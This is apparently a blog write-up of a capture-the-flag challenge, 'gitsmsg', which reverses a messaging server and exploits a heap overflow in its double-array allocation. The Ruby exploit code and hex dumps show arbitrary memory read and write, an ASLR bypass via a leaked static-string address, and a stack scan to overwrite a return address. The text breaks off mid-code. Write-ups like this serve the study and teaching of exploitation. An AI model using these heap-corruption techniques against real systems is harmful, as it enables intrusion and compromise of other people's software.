---
id: 1756
title: 'Ghost in the Shellcode: gitsmsg (Pwnage 299)'
date: '2014-01-27T10:57:31-05:00'
author: 'Ron Bowes'
layout: post
guid: 'https://blog.skullsecurity.org/?p=1756'
permalink: /2014/ghost-in-the-shellcode-gitsmsg-pwnage-299
categories:
    - GITS2014
    - Hacking
    - 'Reverse Engineering'
---

"It's Saturday night; I have no date, a 2L bottle of Shasta, and my all-rush mix tape. Let's rock!"

...that's what I said before I started gitsmsg. I then entered "Rush" into <a href="http://www.pandora.com">Pandora</a>, and listened to a mix of Rush, Kansas, Queen, Billy Idol, and other 80's rock for the entire level. True story.

Anyway, let's get on with it! Not too long ago I posted <a href='/2014/ghost-in-the-shellcode-ti-1337-pwnable-100'>my writeup</a> for the 100-level "Pwnage" challenge from Ghost in the Shellcode. Now, it's time to get a little more advanced and talk about the 299-level challenge: gitsmsg. Solved by only <a href='https://2014.ghostintheshellcode.com/solve-counts.txt'>11 teams</a>, this was considerably more challenging.

As before, you can obtain the binary, my annotated IDA database, and exploit code <a href='https://github.com/iagox86/gits-2014/tree/master/gitsmsg'>on my Github page</a>
<!--more-->
<h2>Overview</h2>

I'll start right out by saying: gits was a huge timesink, for me. It was a Linux-based 32-bit application, which was nice, but the codebase was biiiiig and scary, it took a long time to reverse it, and then possibly even longer to get the exploit working. I'll explain the bumps I hit as I go through this.

The summary is, it's a messaging server. You log in, queue/view/modify/delete messages for other users, send those messages, and read your own. The messages are stored in a heap-based linked list, and one type of message was vulnerable to a heap-based overflow. To make things difficult, the system implemented <a href='http://en.wikipedia.org/wiki/Address_space_layout_randomization'>address-space layout randomization</a> (ASLR) and <a href='http://en.wikipedia.org/wiki/Data_Execution_Prevention'>data execution prevention</a> (DEP), which had to be bypassed, as well as having <a href='http://tk-blog.blogspot.com/2009/02/relro-not-so-well-known-memory.html'>read-only relocations</a> (RELRO)enabled, which marks its imports as read-only once they've been set up by the dynamic linker.

So, a heap overflow on a system with all modern protections. Sounds like a challenge!

This time, I'm not going to spend any time on the assembly or reversing portions, there's just too much. I'll describe the protocol, the vulnerability, and the exploit. My IDA file&mdash;available from the Github link above&mdash;is heavily annotated, so feel free to peruse it! And if you're going to debug it, make sure you disable fork()/alarm() as I described in <a href='https://blog.skullsecurity.org/2014/ghost-in-the-shellcode-ti-1337-pwnable-100'>my last post</a>!

<h2>The protocol</h2>

As I mentioned before, this is a messaging server. It supports eight different payload types, numbered 0x10 to 0x17, which can be used in nine different message types, numbered 0x01 to 0x09. Just for fun, <a href='/blogdata/gitsmsg-1.png'>here</a> are my scratch notes I wrote while working on it.

<h3>Payload types</h3>

The following payloads are defined:

<ul>
  <li>0x10 :: a byte (uint8)</li>
  <li>0x11 :: an integer (uint32)</li>
  <li>0x12 :: a double (uint64)</li>
  <li>0x13 :: an array of bytes (uint8[])</li>
  <li>0x14 :: an array of integers (uint32[])</li>
  <li>0x15 :: an array of doubles (uint64[])</li>
  <li>0x16 :: a static null-terminated string (there are 4 or 5 possible choices, indexed with a byte value)</li>
</ul>

It's possible that the types I called double might actually be intended as 64-bit integers, but ultimately it doesn't matter.

No message can be longer than 0x400 bytes, total. Which means an array of doubles can't be longer than 0x80 elements (0x80 elements * 8 bytes/element = 0x400 bytes).

<h3>Message types</h3>

These payload types can be used in any of the 9 message types:

<ul>
  <li>0x01 :: login :: must be sent initially, also retrieves your messages</li>
  <li>0x02 :: delete_queued_message :: unlinks a message from a linked list</li>
  <li>0x03 :: retrieve_my_messages :: retrieve a list of the queued messages I've sent</li>
  <li>0x04 :: store_message :: saves a message into a linked list of queued messages</li>
  <li>0x05 :: get_stored_message :: retrieves and displays a message from a linked list</li>
  <li>0x06 :: do_weird_math :: loops through the messages and does some kind of math that I didn't dig into</li>
  <li>0x07 :: send_queued_messages :: writes all your messages to the filesystem under the recipient's username; he'll get them when he logs in</li>
  <li>0x08 :: edit_queued_message :: edit a queued message</li>
  <li>0x09 :: quit</li>
</ul>

<h3>Message struct</h3>

The messages are all stored in a struct that looks like:

<ul>
  <li>(uint32) unknown</li>
  <li>(uint32) message_type</li>
  <li>(uint32) message-specific payload (see below)</li>
  <li>(uint32) message-specific payload (part 2)
  <li>(char[256]) from_username</li>
  <li>(char[256]) to_username</li>
  <li>(char[240]) filename</li>
  <li>(char[272]) unknown/unused</li>
  <li>(void*) next_message</li>
</ul>

Basically, a linked list. The most interesting field is "message-specific payload", which contains different data depending on the message_type (I'm guessing it's implemented as a union in the original program).

For the simple datatypes (byte/int32/double), the message-specific payload is simply the 8-, 32-, or 64-bit value, stored across the pair of message-specific payload values.

For the array types (byte array/int32 array/double array), the first message-specific payload value is a 32-bit pointer to some freshly allocated memory, and the second is the length of said memory (this pair will be very important later, when we read/write arbitrary memory!).

Finally, for the static string type, it's a pointer to one of several static strings that are hardcoded into the binary (this value will be useful later when we want to bypass ASLR).

Later on, there's a field I called 'unknown/unused'; I suspect that it's simply designed to make the struct bigger than a single message can possibly be&mdash;0x400 bytes&mdash;to prevent overwriting the 'next_message' pointer. But that's purely an unvalidated guess, especially since there are easier and better ways to get an arbitrary memory write (as I'll explain later).

<h2>The vulnerability</h2>

I actually found this issue quite by accident. I was implementing the store/get protocol, and I kept getting mysterious SIG_ABRT messages. I plugged in a debugger and found that it was crashing in malloc(). Sweet! Sounds like a heap overflow!

I narrowed it down by simply adding/removing messages of the different types, until I discovered that message type 0x15&mdash;DOUBLE_ARRAY&mdash;was the culprit.

I took a look at the code that saves the double arrays to memory and immediately noticed this:

<pre>
<span class="Statement">.text</span>:<span class="Identifier">B7FFD897</span>         <span class="Identifier">mov</span>     <span class="Identifier">eax</span>, <span class="Identifier">dword</span> <span class="Identifier">ptr</span> [<span class="Identifier">esp</span>+<span class="Constant">3</span><span class="Identifier">Ch</span>+<span class="Identifier">local_length</span>] <span class="Comment">; jumptable 000017B1 case 5</span>
<span class="Statement">.text</span>:<span class="Identifier">B7FFD89B</span>         <span class="Identifier">lea</span>     <span class="Identifier">esi</span>, [<span class="Identifier">eax</span>*<span class="Constant">8</span>+0]  <span class="Comment">; esi = local_length * 8</span>
<span class="Statement">.text</span>:<span class="Identifier">B7FFD8A2</span>         <span class="Identifier">cmp</span>     <span class="Identifier">esi</span>, <span class="Constant">3</span><span class="Identifier">FFh</span>
<span class="Statement">.text</span>:<span class="Identifier">B7FFD8A8</span>         <span class="Identifier">mov</span>     [<span class="Identifier">ebp</span>+<span class="Identifier">message</span><span class="Statement">.length</span><span class="Identifier">_for_certain_types</span>], <span class="Identifier">eax</span>
<span class="Statement">.text</span>:<span class="Identifier">B7FFD8AB</span>         <span class="Identifier">ja</span>      <span class="Identifier">return_send_1005</span>
<span class="Statement">.text</span>:<span class="Identifier">B7FFD8B1</span>         <span class="Identifier">mov</span>     [<span class="Identifier">esp</span>+<span class="Constant">3</span><span class="Identifier">Ch</span>+<span class="Identifier">out_arg_0</span>], <span class="Identifier">eax</span> <span class="Comment">; size</span>
<span class="Statement">.text</span>:<span class="Identifier">B7FFD8B4</span>         <span class="Identifier">call</span>    <span class="Identifier">_malloc</span>         <span class="Comment">; XXX - VULN! Allocate the wrong number of bytes - it's not multiplying by 8</span>
<span class="Statement">.text</span>:<span class="Identifier">B7FFD8B9</span>         <span class="Identifier">test</span>    <span class="Identifier">eax</span>, <span class="Identifier">eax</span>
<span class="Statement">.text</span>:<span class="Identifier">B7FFD8BB</span>         <span class="Identifier">jnz</span>     <span class="Identifier">short</span> <span class="Identifier">receive_esi_bytes_into_eax</span>
<span class="Statement">.text</span>:<span class="Identifier">B7FFD8BD</span>         <span class="Identifier">lea</span>     <span class="Identifier">esi</span>, [<span class="Identifier">esi</span>+0]
<span class="Statement">.text</span>:<span class="Identifier">B7FFD8C0</span>         <span class="Identifier">jmp</span>     <span class="Identifier">return_send_1005</span>
</pre>

It's multiplying the array size by 8, but not the malloc'd size! That means it'll always try to copy 8x too much data into the array!

Now, what can we do with this?

<h3>Reading and writing arbitrary memory</h3>

It's important to remember the structure of array-containing messages to understand how to read memory. In particular, this structure:

<ul>
  <li>(uint32) unknown</li>
  <li>(uint32) message_type</li>
  <li>(uint32) message-specific payload (pointer)</li>
  <li>(uint32) message-specific payload (length)</li>
  <li>...</li>
</ul>

Let's say we allocate an array of ten doubles using the following code (you can find these functions defined in my exploit code on Github):

<pre>
<span class="lnr"> 1 </span>s = <span class="Type">TCPSocket</span>.new(<span class="Special">&quot;</span><span class="Constant">192.168.1.119</span><span class="Special">&quot;</span>, <span class="Constant">8585</span>)
<span class="lnr"> 2 </span>
<span class="lnr"> 3 </span>receive_code(s, <span class="Constant">0x00001000</span>, <span class="Special">&quot;</span><span class="Constant">init</span><span class="Special">&quot;</span>)
<span class="lnr"> 4 </span>
<span class="lnr"> 5 </span>login(s)
<span class="lnr"> 6 </span>
<span class="lnr"> 7 </span>store(s, <span class="Type">VARDATA_TYPE_DOUBLE_ARRAY</span>, [<span class="Constant">0x4141414141414141</span>] * <span class="Constant">10</span>)
<span class="lnr"> 8 </span>result = get(s, <span class="Constant">0</span>)
<span class="lnr"> 9 </span>
<span class="lnr">10 </span><span class="Type">Hex</span>.print(result)
</pre>

Everything will be normal and it'll output:

<pre>
<span class="Constant">0000</span>  <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span>   <span class="Type">AAAAAAAAAAAAAAAA</span>
<span class="Constant">0010</span>  <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span>   <span class="Type">AAAAAAAAAAAAAAAA</span>
<span class="Constant">0020</span>  <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span>   <span class="Type">AAAAAAAAAAAAAAAA</span>
<span class="Constant">0030</span>  <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span>   <span class="Type">AAAAAAAAAAAAAAAA</span>
<span class="Constant">0040</span>  <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span>   <span class="Type">AAAAAAAAAAAAAAAA</span>
</pre>

Great! Now let's allocate a int32 array, right after the double array:

<pre>
...
<span class="lnr">1 </span>store(s, <span class="Type">VARDATA_TYPE_DOUBLE_ARRAY</span>, [<span class="Constant">0x4141414141414141</span>] * <span class="Constant">10</span>)
<span class="lnr">2 </span>store(s, <span class="Type">VARDATA_TYPE_INT_ARRAY</span>, [<span class="Constant">0x42424242</span>] * <span class="Constant">2</span>)
<span class="lnr">3 </span><span class="Type">Hex</span>.print(get(s, <span class="Constant">1</span>))
<span class="lnr">4 </span><span class="Type">Hex</span>.print(get(s, <span class="Constant">0</span>))
</pre>

We get this output:

<pre>
<span class="lnr">2 </span><span class="Constant">0000</span>  <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">19</span> <span class="Constant">04</span> <span class="Constant">00</span> <span class="Constant">00</span>   AAAAAAAAAAAA....
<span class="lnr">3 </span><span class="Constant">0010</span>  <span class="Constant">01</span> <span class="Constant">00</span> <span class="Constant">00</span> <span class="Constant">00</span> <span class="Constant">14</span> <span class="Constant">00</span> <span class="Constant">00</span> <span class="Constant">00</span> <span class="Constant">48</span> <span class="Constant">28</span> <span class="Constant">00</span> B8 <span class="Constant">02</span> <span class="Constant">00</span> <span class="Constant">00</span> <span class="Constant">00</span>   ........H(......
<span class="lnr">4 </span><span class="Constant">0020</span>  <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">00</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span>   AAAAAAAAAA.AAAAA
<span class="lnr">5 </span><span class="Constant">0030</span>  <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span>   AAAAAAAAAAAAAAAA
<span class="lnr">6 </span><span class="Constant">0040</span>  <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span>   AAAAAAAAAAAAAAAA
<span class="lnr">7 </span><span class="Statement">Length:</span> <span class="Constant">0x50</span> (<span class="Constant">80</span>)
<span class="lnr">8 </span><span class="Constant">0000</span>  <span class="Constant">42</span> <span class="Constant">42</span> <span class="Constant">42</span> <span class="Constant">42</span> <span class="Constant">42</span> <span class="Constant">42</span> <span class="Constant">42</span> <span class="Constant">42</span>                           BBBBBBBB
<span class="lnr">9 </span><span class="Statement">Length:</span> <span class="Constant">0x8</span> (<span class="Constant">8</span>)
</pre>

Woah, what's going on here!?

What we're actually seeing is the first 0x0c (12) bytes of the double array that we created, printing out as normal (a bunch of 'A's), followed by the Heap header of the next message! The first array thinks it has 80 bytes to itself, and uses/displays all of them, when in reality it only actually has about 12 bytes (we only allocated 8 bytes, but rounding happens). The remaining 68 bytes are still in the heap's pool, and are completely fair game to be allocted. Then, when the second array is allocated, it takes up those bytes.

In other words, we have memory that looks like this:

<pre>
------------------------------------------------------------------------------------------------------
|                                  Unallocated..........                                             |
------------------------------------------------------------------------------------------------------
|  [empty memory]                                                                                    |
------------------------------------------------------------------------------------------------------
</pre>

The first array is stored in allocated memory. First, the message metadata (the type, message-specific data, to, from, filename, next message) is allocated. We'll ignore that for now. More importantly, the data buffer is allocated, and it's allocated too short!

Then array requests 8 bytes to store all its data, and gets 12 bytes (because rounding or whatever):
<pre>
------------------------------------------------------------------------------------------------------
|   array1   |                    Unallocated..........                                              |
------------------------------------------------------------------------------------------------------
|  [empty memory]                                                                                    |
------------------------------------------------------------------------------------------------------
</pre>

The first array thinks it has 80 bytes, and fills it all up
<pre>
------------------------------------------------------------------------------------------------------
|   array1   |                    Unallocated..........                                              |
------------------------------------------------------------------------------------------------------
|AAAAAAAAAAAA<span style='color: red'>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>                    |
------------------------------------------------------------------------------------------------------
</pre>

Then along comes array2. Two chunks of memory are allocated for it, as well. The message metadata is allocated first, then a buffer for the message data is allocated. Because the metadata is allocated first, it ends up right after array1, and immediately populates the heap header:
<pre>
------------------------------------------------------------------------------------------------------
|  array1    |                    array2 metadata......                                              |
------------------------------------------------------------------------------------------------------
|AAAAAAAAAAAA\x19\x04\x00\x00\x01\x00\x00\x00<span style='color: red'>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>                    |
------------------------------------------------------------------------------------------------------
</pre>

Then message2 populates its various values, including the type (0x14 = INT_ARRAY), message-specific data (pointer to buffer = 0xb8002848, and length = 0x00000002), and from_username (which, kind of confusingly, I set to all 'A's). In the end, the entire rest of array1 is overwritten:
<pre>
------------------------------------------------------------------------------------------------------
|  array1    |                    array2 metadata......                                              |
------------------------------------------------------------------------------------------------------
|AAAAAAAAAAAA\x19\x04\x00\x00\x01\x00\x00\x00\x48\x28\x00\xb8\x02\x00\x00\x00AAAAAAAAAAAAAAAAAAAAA...|
------------------------------------------------------------------------------------------------------
</pre>

Then, when we displayed it, we saw exactly that.

The most interesting part of this is the message-specific data at bytes 0x18 - 0x20 of array2: 0xb8002848 and 0x00000002. They are part of the second array's metadata, and are located right smack in the middle of where the first array thinks <em>its</em> data is! And since the first array thinks the memory belongs to it, we can read/write it via the first array. To put it another way, when array1 thinks it's editing its own value, it's actually editing array2's metadata.

What happens if I now edit the first array (the value here, 0xB7FFEC04, is a place where I happen know I'll find a static string in memory)?

<pre>
edit(s, <span class="Constant">1</span>, <span class="Constant">3</span>, [<span class="Constant">0xB7FFEC04</span>, <span class="Constant">10</span>].pack(<span class="Special">&quot;</span><span class="Constant">II</span><span class="Special">&quot;</span>))
</pre>

Then read the second?

<pre>
<span class="Type">Hex</span>.print(get(s, <span class="Constant">0</span>))
</pre>

It's going to dump out whatever happened to be in memory! It's truncated to the length I set (10 bytes) multiplied by the element size (and INT_ARRAY has 4-byte elements) for a total length of 40 bytes:

<pre>
<span class="lnr">1 </span><span class="Statement">Length:</span> <span class="Constant">0x8</span> (<span class="Constant">8</span>)
<span class="lnr">2 </span><span class="Constant">0000</span>  2F <span class="Constant">68</span> 6F 6D <span class="Constant">65</span> 2F <span class="Constant">67</span> <span class="Constant">69</span> <span class="Constant">74</span> <span class="Constant">73</span> 6D <span class="Constant">73</span> <span class="Constant">67</span> 2F 6D <span class="Constant">73</span>   <span class="Statement">/</span><span class="Constant">home</span><span class="Statement">/gi</span>tsmsg/ms
<span class="lnr">3 </span><span class="Constant">0010</span>  <span class="Constant">67</span> <span class="Constant">73</span> 2F <span class="Constant">25</span> <span class="Constant">73</span> 2F <span class="Constant">25</span> <span class="Constant">30</span> <span class="Constant">38</span> <span class="Constant">78</span> <span class="Constant">25</span> <span class="Constant">30</span> <span class="Constant">38</span> <span class="Constant">78</span> <span class="Constant">00</span> <span class="Constant">00</span>   gs/<span class="Identifier">%s</span>/%08x%08x..
<span class="lnr">4 </span><span class="Constant">0020</span>  <span class="Constant">55</span> 6E <span class="Constant">62</span> <span class="Constant">72</span> <span class="Constant">65</span> <span class="Constant">61</span> 6B <span class="Constant">61</span>                           Unbreaka
</pre>

Going back to the memory layout we looked at before, we saw that the message-specific data (the pointer and the length) overwrote array1:

<pre>
------------------------------------------------------------------------------------------------------
|  array1    |                    array2 metadata......                                              |
------------------------------------------------------------------------------------------------------
|AAAAAAAAAAAA\x19\x04\x00\x00\x01\x00\x00\x00<span style="font-weight: bold">\x48\x28\x00\xb8\x02\x00\x00\x00</span>AAAAAAAAAAAAAAAAAAAAA...|
------------------------------------------------------------------------------------------------------
</pre>

But we modified array1 to change those values:

<pre>
------------------------------------------------------------------------------------------------------
|  array1    |                    array2 metadata......                                              |
------------------------------------------------------------------------------------------------------
|AAAAAAAAAAAA\x19\x04\x00\x00\x01\x00\x00\x00<span style="color: red">\x04\xec\xff\xb7\x0a\x00\x00\x00</span>AAAAAAAAAAAAAAAAAAAAA...|
------------------------------------------------------------------------------------------------------
</pre>

And therefore, when array2 thought it was reading from its own buffer, it was actually reading from the wrong location - 0xB7FFEC04.

(If we use the edit() function on array2, we can write to that memory as well.)

The summary is, we can read and write arbitrary memory, by allocating two arrays, using the first to modify the second's metadata, then reading or writing the second's data.

Still with me? I hope so!

<h3>Bypassing ASLR</h3>

For those of you who don't know what ASLR is, I recommend reading <a href='https://en.wikipedia.org/wiki/Address_space_layout_randomization'>the Wikipedia page</a>. The summary is, it means that modules and stack don't load to the same address twice. So, even though I have an arbitrary read/write memory attack, I don't know where memory <em>is</em>, in theory.

So how do we find it?

The first thing to realize is that the size of the binary in memory doesn't change, and the parts within the binary don't get re-arranged, so if we can determine where <em>anything</em> in the binary gets loaded, we can use clever math to figure out where <em>everything</em> gets loaded. We just have to leak a single address.

How do we leak a single address? It turns out, with the read-memory attack we just saw, this is rather easy. We allocate a double array, as usual, which will get overwritten by the next allocation:

<pre>
<span class="lnr">1 </span>store(s, <span class="Type">VARDATA_TYPE_DOUBLE_ARRAY</span>, [<span class="Constant">0x4141414141414141</span>] * <span class="Constant">10</span>)
</pre>

Then we allocate a static string, which will overwrite the latter part of the double array:

<pre>
<span class="lnr">1 </span>store(s, <span class="Type">VARDATA_TYPE_STRING</span>, <span class="Constant">0</span>)
</pre>

As I've mentioned before, the strings are indexes into a hardcoded list of strings. Therefore, the address of a static string in the binary will be saved in the message-specific data.

Now, if we print out the double array:

<pre>
<span class="lnr">1 </span><span class="Type">Hex</span>.print(get(s, <span class="Constant">1</span>))
</pre>

We get the address of the first such string:

<pre>
<span class="lnr">1 </span><span class="Constant">0000</span>  <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">41</span> <span class="Constant">19</span> <span class="Constant">04</span> <span class="Constant">00</span> <span class="Constant">00</span>   <span class="Type">AAAAAAAAAAAA</span>....
<span class="lnr">2 </span><span class="Constant">0010</span>  <span class="Constant">01</span> <span class="Constant">00</span> <span class="Constant">00</span> <span class="Constant">00</span> <span class="Constant">16</span> <span class="Constant">00</span> <span class="Constant">00</span> <span class="Constant">00</span> <span class="Type">B0</span> <span class="Type">EB</span> <span class="Type">FF</span> <span class="Type">B7</span> <span class="Constant">00</span> <span class="Constant">00</span> <span class="Constant">00</span> <span class="Constant">00</span>   ................
<span class="lnr">3 </span>...
</pre>

which is 0xb7ffebb0, in this case. I know&mdash;from the disassembled code&mdash;that this value is always 0x2bb0 bytes from the start of the binary, so I can calculate that the base address is 0xb7ffebb0 - 0x2bb0, or at address 0xb7ffc000 on this particular execution. From now on, I can base every address on that.

And thus, ASLR has been bypassed for the binary. But not, sadly, for the stack. I couldn't find any way to leak a useful stack address.

<h3>Controlling EIP</h3>

Up till now, every writeup I've read has taken essentially the same steps, although they don't go through them in as much detail as me (I love writing :) ). However, this is where paths diverge, and no two people have taken the same one.

The most obvious solution to controlling EIP is to overwrite the global offset table, which is the same as the solution to TI-1337. But, after a lot of mysterious crashing and debugging, I found out what <a href='http://tk-blog.blogspot.com/2009/02/relro-not-so-well-known-memory.html'>RELRO</a> means: it means that the relocations are re-mapped as read-only after they are filled in. The .dtor section (destructors) are likewise mapped as read-only. Crap!

I spent a long, long time trying to figure out what to overwrite. Can I cause path traversal? Can anything in the .data section cause an overflow? Can I read a stack address from anywhere in known memory? etc. etc., but no dice.

Eventually, I realized that I could read large chunks of memory, so why don't I read the entire space where the stack <em>might</em> be? Experimentally, I determined that, at least on my system, the stack was always between 0xBF800000 and 0xBFFFFFFF. With that in mind, I wrote this beast:

<pre>
<span class="lnr"> 1 </span><span class="Comment"># This function is kind of an ugly hack, but it works reliably so I can't really</span>
<span class="lnr"> 2 </span><span class="Comment"># complain.</span>
<span class="lnr"> 3 </span><span class="Comment">#</span>
<span class="lnr"> 4 </span><span class="Comment"># It basically searches a large chunk of memory for a specific return address.</span>
<span class="lnr"> 5 </span><span class="Comment"># When it finds that address, it returns there.</span>
<span class="lnr"> 6 </span><span class="rubyDefine">def</span> <span class="Identifier">find_return_address</span>(s, base_addr)
<span class="lnr"> 7 </span>  address_to_find = [base_addr + <span class="Type">MAIN_RETURN_ADDRESS</span>].pack(<span class="Special">&quot;</span><span class="Constant">I</span><span class="Special">&quot;</span>)
<span class="lnr"> 8 </span>
<span class="lnr"> 9 </span>  <span class="Comment"># Store an array of doubles. This will overlap the next allocation</span>
<span class="lnr">10 </span>  store(s, <span class="Type">VARDATA_TYPE_DOUBLE_ARRAY</span>, [<span class="Constant">0x5e5e5e5e5e5e5e5e</span>] * <span class="Constant">4</span>)
<span class="lnr">11 </span>
<span class="lnr">12 </span>  <span class="Comment"># Store an array of bytes. We'll be able to change the length and locatino</span>
<span class="lnr">13 </span>  <span class="Comment"># of this buffer in order to read arbitrary memory</span>
<span class="lnr">14 </span>  store(s, <span class="Type">VARDATA_TYPE_BYTE_ARRAY</span>, [<span class="Constant">0x41</span>])
<span class="lnr">15 </span>
<span class="lnr">16 </span>  <span class="Comment"># Overwrite the location and size of the byte array. The location will be</span>
<span class="lnr">17 </span>  <span class="Comment"># set to STACK_MIN, and the size will be set to STACK_MAX - STACK_MIN</span>
<span class="lnr">18 </span>  edit(s, <span class="Constant">1</span>, <span class="Constant">3</span>, [<span class="Type">STACK_MIN</span>, (<span class="Type">STACK_MAX</span> - <span class="Type">STACK_MIN</span>)].pack(<span class="Special">&quot;</span><span class="Constant">II</span><span class="Special">&quot;</span>))
<span class="lnr">19 </span>  puts(<span class="Special">&quot;</span><span class="Constant">Reading the stack (0x%08x - 0x%08x)...</span><span class="Special">&quot;</span> % [<span class="Type">STACK_MIN</span>, <span class="Type">STACK_MAX</span>])
<span class="lnr">20 </span>
<span class="lnr">21 </span>  <span class="Comment"># We have to re-implement &quot;get&quot; here, so we can handle a large buffer and</span>
<span class="lnr">22 </span>  <span class="Comment"># so we can quit when we find what we need</span>
<span class="lnr">23 </span>  out = [<span class="Type">MESSAGE_GET</span>, <span class="Constant">0</span>].pack(<span class="Special">&quot;</span><span class="Constant">II</span><span class="Special">&quot;</span>)
<span class="lnr">24 </span>  s.write(out)
<span class="lnr">25 </span>  get_int(s) <span class="Comment"># type (don't care)</span>
<span class="lnr">26 </span>  len = get_int(s)
<span class="lnr">27 </span>  result = <span class="Special">&quot;&quot;</span>
<span class="lnr">28 </span>
<span class="lnr">29 </span>  <span class="Comment"># Loop and read till we either reach the end, of we find the value we need</span>
<span class="lnr">30 </span>  <span class="Statement">while</span>(result.length &lt; len)
<span class="lnr">31 </span>    result = result + s.recv(<span class="Type">STACK_MAX</span> - <span class="Type">STACK_MIN</span> + <span class="Constant">1</span>)
<span class="lnr">32 </span>
<span class="lnr">33 </span>    <span class="Comment"># As soon as we find the location, end</span>
<span class="lnr">34 </span>    <span class="Statement">if</span>(loc = result.index(address_to_find))
<span class="lnr">35 </span>      <span class="Statement">return</span> <span class="Type">STACK_MIN</span> + loc
<span class="lnr">36 </span>    <span class="Statement">end</span>
<span class="lnr">37 </span>  <span class="Statement">end</span>
<span class="lnr">38 </span>
<span class="lnr">39 </span>  <span class="Comment"># D'awww :(</span>
<span class="lnr">40 </span>  puts(<span class="Special">&quot;</span><span class="Constant">Couldn't find the return address :(</span><span class="Special">&quot;</span>)
<span class="lnr">41 </span>  <span class="Statement">exit</span>
<span class="lnr">42 </span><span class="rubyDefine">end</span>
</pre>

It uses the <em>exact same technique</em> as we initially used to read that static string from memory, except instead of reading 20 or 30 bytes, it reads 0x7fffff&mdash;that's about 8 megabytes.

Somewhere in that chunk of memory will be the actual stack. And somewhere on the stack will be the return address of the main looping function. And, fortunately, because I can capture the base address of the binary (outlined last section), I know exactly what that address will be!

To put it another way: I know that the main loop returns to an address when it's done. I can calculate that address, and therefore I know the absolute return address of the main loop. If I know it, it means I can find it on the stack. And if I can find it on the stack, it means I can change it.

Here's some code that finds the address and changes it:

<pre>
<span class="lnr"> 1 </span><span class="Comment"># Set up the connection</span>
<span class="lnr"> 2 </span>s = <span class="Type">TCPSocket</span>.new(<span class="Special">&quot;</span><span class="Constant">192.168.1.119</span><span class="Special">&quot;</span>, <span class="Constant">8585</span>)
<span class="lnr"> 3 </span>receive_code(s, <span class="Constant">0x00001000</span>, <span class="Special">&quot;</span><span class="Constant">init</span><span class="Special">&quot;</span>)
<span class="lnr"> 4 </span>login(s)
<span class="lnr"> 5 </span>
<span class="lnr"> 6 </span><span class="Comment"># Get the base address</span>
<span class="lnr"> 7 </span>base_addr = get_base_address(s)
<span class="lnr"> 8 </span>
<span class="lnr"> 9 </span><span class="Comment"># Get the return address</span>
<span class="lnr">10 </span>return_address = find_return_address(s, base_addr)
<span class="lnr">11 </span>
<span class="lnr">12 </span><span class="Comment"># Do a typical overwrite - overwrite the main loop's return address</span>
<span class="lnr">13 </span><span class="Comment"># with 0x43434343</span>
<span class="lnr">14 </span>store(s, <span class="Type">VARDATA_TYPE_DOUBLE_ARRAY</span>, [<span class="Constant">0x4141414141414141</span>] * <span class="Constant">10</span>)
<span class="lnr">15 </span>store(s, <span class="Type">VARDATA_TYPE_INT_ARRAY</span>, [<span class="Constant">0x42424242</span>])
